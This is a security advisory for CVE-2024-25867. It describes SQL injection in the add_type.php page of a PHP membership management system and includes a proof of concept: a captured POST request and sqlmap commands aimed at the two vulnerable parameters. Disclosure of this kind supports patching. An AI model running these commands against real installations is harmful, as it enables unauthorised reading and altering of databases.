# Membership Management System in PHP - SQL Injection (Add Membership Type)

### CVE Assigned:

**[CVE-2024-25867](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-25867)** [mitre.org](https://www.cve.org/CVERecord?id=CVE-2024-25867) [nvd.nist.org](https://nvd.nist.gov/vuln/detail/CVE-2024-25867)

### Date:

> 9 Feb 2024

### Author Email:

> yevhenii.butenko@outlook.com

### Vendor Homepage:

> <https://codeastro.com/>

### Software Link:

> [Membership Management System in PHP](https://codeastro.com/membership-management-system-in-php-with-source-code/)

### Version:

> v 1.0

### SQL Injection:

> SQL injection is a type of security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. Usually, it involves the insertion or "injection" of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system, and in some cases, issue commands to the operating system.

### Affected Components:

> add\_type.php

> Two parameters `membershipType` and `membershipAmount` within Add Membership Type mechanism are vulnerable to SQL Injection.

[![membershipType](https://github.com/0xQRx/VulnerabilityResearch/raw/master/2024/img/membership_management_sql_add_type_m_type.png?raw=true)](https://github.com/0xQRx/VulnerabilityResearch/blob/master/2024/img/membership_management_sql_add_type_m_type.png?raw=true)

[![membershipAmount](https://github.com/0xQRx/VulnerabilityResearch/raw/master/2024/img/membership_management_sql_add_type_m_amount.png?raw=true)](https://github.com/0xQRx/VulnerabilityResearch/blob/master/2024/img/membership_management_sql_add_type_m_amount.png?raw=true)

### Description:

> The presence of SQL Injection in the application enables attackers to issue direct queries to the database through specially crafted requests.

## Proof of Concept:

### SQLMap

> NOTE: Update the cookie.

Save the following request to `mm_add_type.txt`:

```
POST /MembershipM-PHP/add_type.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

membershipType=test&membershipAmount=1

```

Use `sqlmap` with `-r` option to exploit the vulnerability:

```
sqlmap -r mm_add_type.txt --level 5 --risk 3 --batch --dbms MYSQL -p membershipAmount

```

```
sqlmap -r mm_add_type.txt --level 5 --risk 3 --batch --dbms MYSQL -p membershipType

```

## Recommendations

When using this Membership Management System, it is essential to update the application code to ensure user input sanitization and proper restrictions for special characters.
